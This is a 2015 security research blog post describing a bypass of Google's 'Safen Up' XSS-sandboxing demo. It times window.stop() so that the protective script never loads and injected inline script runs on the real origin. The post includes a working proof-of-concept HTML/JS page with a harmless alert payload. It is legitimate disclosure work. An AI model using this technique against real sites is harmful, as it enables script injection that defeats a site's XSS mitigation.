---
title: "XSS via window.stop() - Google Safen Up"
date: "2015-05-01"
description: "XSS via proper timing of window.stop()"
---

In the beginning of 2015, Google launched a new program called [Vulnerability Research Grants](https://www.google.com/about/appsecurity/research-grants/), "_with the goal of rewarding security researchers that look into the security of Google products and services even in the case when no vulnerabilities are found_". I have submitted quite a few bugs to them and decided to give it a try. The grant was given to me after a few days of waiting and my task was to check [Google Safen Up](https://safendup-xss-game.appspot.com/) application which presents an interesting approach to minimize effects of XSS-es.

The page is quite simple and seems to be very easily exploitable, just have a look...

[![](http://2.bp.blogspot.com/-E4Y6h-CxevI/VUPmRxozuTI/AAAAAAAAAGA/5PG4HKeafOo/s1600/safen1.png)](http://2.bp.blogspot.com/-E4Y6h-CxevI/VUPmRxozuTI/AAAAAAAAAGA/5PG4HKeafOo/s1600/safen1.png)

Sending simple XSS payload...

[![](http://2.bp.blogspot.com/-vJzjIstFtI8/VUPmR-4eV7I/AAAAAAAAAGE/OVCm3TdHWXk/s1600/safen2.png)](http://2.bp.blogspot.com/-vJzjIstFtI8/VUPmR-4eV7I/AAAAAAAAAGE/OVCm3TdHWXk/s1600/safen2.png)

... and it works!

So what's the deal? The deal is when you try to `alert(document.domain)`:

[![](http://4.bp.blogspot.com/-g13VwKkyiEc/VUPmRwoeCpI/AAAAAAAAAF8/knKfUzlDU0c/s1600/safen3.png)](http://4.bp.blogspot.com/-g13VwKkyiEc/VUPmRwoeCpI/AAAAAAAAAF8/knKfUzlDU0c/s1600/safen3.png)

The XSS executes but in a completely different, sandbox domain. Thanks to that, most malicious effects of XSS are mitigated as the other domain has no access to any sensitive data.

The HTML source of the XSS-ed page was:

```html
<!DOCTYPE html>
<html>
  <head>
    <script src="//safenup.googleusercontent.com/safen-me-up.js"></script>
    <title>Hello, world of XSS</title>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
  </head>
  <body id="level1">
        <img src="/static/logos/level1.png" />      
    <div>
      Sorry, no results were found for
      <b
        ><script>
          alert(document.domain);
        </script></b
      >. <a href=".">Try again</a>.    
    </div>
  </body>
</html>
```

Looking just at the source, it may seem as if the XSS should fire in the original domain but the whole magic actually happens in the `safen-me-up.js` file. It creates a new iframe, put everything that is after the script tag in it and then remove all the elements (besides the iframe of course) from the original site.

So is it possible to bypass the protection? Actually I found a way. The whole security of the solution is based on including a single JS file. What if that would be possible to make it not being included at all? I stepped on an interesting behavior of Chrome which seemingly was also a novel attack type for members of Google Security Team.

It is very simple: when you hit the Stop button in Chrome, it immediately stops fetching any external resources (including scripts) but **will still happily execute inline scripts**. Hence, if you happen to press stop at the right time, you’ll prevent the browser from loading `safen-me-up.js`, making the XSS execute on the right domain. To do that programmatically you need to use `window.stop()` method.

The right moment to stop is difficult to predict as it depends on a lot of factors, especially on network bandwidth. Hence I have prepared a script which tries to load the page in iframe and stop it after an increasing intervals of time, starting with 100ms. It did a pretty good job on several machines I tested ergo I think we can say it's somewhat reliable.

Here's the script:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>XSS@Safen Up</title>
  </head>
  <body>
    <script>
      var url =
        'https://safendup-xss-game.appspot.com/?query=<u>xsstest\\u003cscript>alert(document.domain),top.postMessage(31337,"\*")\\u003c/script>';
      var run = true;
      var time = 100;
      var timeDelta = 25;
      window.addEventListener("message", onmessage, false);
      function onmessage(ev) {
        if (ev.data !== 31337) return;
        var out =
          ev.origin === "https://safendup-xss-game.appspot.com"
            ? "Time <b>" + time + "</b> ms does the trick for you."
            : "Oops! Wrong origin, the time is probably too big.";
        document.getElementById("outputText").innerHTML = out;
        run = false;
      }
      function testXSS() {
        if (!run) return;
        window[0].location = url + "&" + Math.random();
        setTimeout(function () {
          window.stop();
          time += timeDelta;
          setTimeout(testXSS, 10);
        }, time);
      }
      setTimeout(testXSS, 1000);
    </script>
    <iframe src="about:blank"></iframe>
    <span id="outputText"></span>
  </body>
</html>
```

And here's a proof that it worked:

<iframe src="https://www.youtube.com/embed/jsLYPwQoLAQ" title="" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

XSS executed on safendup-xss-game.appspot.com so everything's just fine :)

I'd like to thank Google Security Team for the research grant and hope the next ones will also result in finding interesting bugs :)
